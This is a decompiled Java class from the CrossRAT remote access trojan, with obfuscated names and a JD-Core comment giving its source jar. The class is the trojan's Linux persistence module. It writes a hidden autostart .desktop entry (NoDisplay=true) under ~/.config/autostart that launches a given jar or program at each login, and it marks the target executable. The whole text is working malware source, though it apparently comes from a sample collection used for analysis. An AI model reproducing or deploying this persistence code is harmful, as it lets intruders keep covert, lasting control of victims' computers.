package b;

import java.io.File;
import java.io.FileWriter;
import java.io.PrintWriter;

public final class d
  extends a
{
  public d(String paramString1, String paramString2, boolean paramBoolean)
  {
    super(paramString1, paramString2, paramBoolean);
  }
  
  private static File b()
  {
    String str = System.getProperty("user.home");
    return new File(str + "/.config/autostart/");
  }
  
  public final void a()
  {
    if (!b().exists()) {
      b().mkdirs();
    }
    Object localObject = new File(b(), this.b + ".desktop");
    (localObject = new PrintWriter(new FileWriter((File)localObject))).println("[Desktop Entry]");
    ((PrintWriter)localObject).println("Type=Application");
    ((PrintWriter)localObject).println("Name=" + this.b);
    if (this.a) {
      ((PrintWriter)localObject).println("Exec=java -jar '" + this.c + "'");
    } else {
      ((PrintWriter)localObject).println("Exec=" + this.c);
    }
    ((PrintWriter)localObject).println("Terminal=false");
    ((PrintWriter)localObject).println("NoDisplay=true");
    ((PrintWriter)localObject).close();
    localObject = new String[] { "chmod", "+x", this.c };
    Runtime.getRuntime().exec((String[])localObject);
  }
}


/* Location:              C:\Users\sihadan\Desktop\CrossRAT\CrossRAT\CrossRat\hmar6.jar!\b\d.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */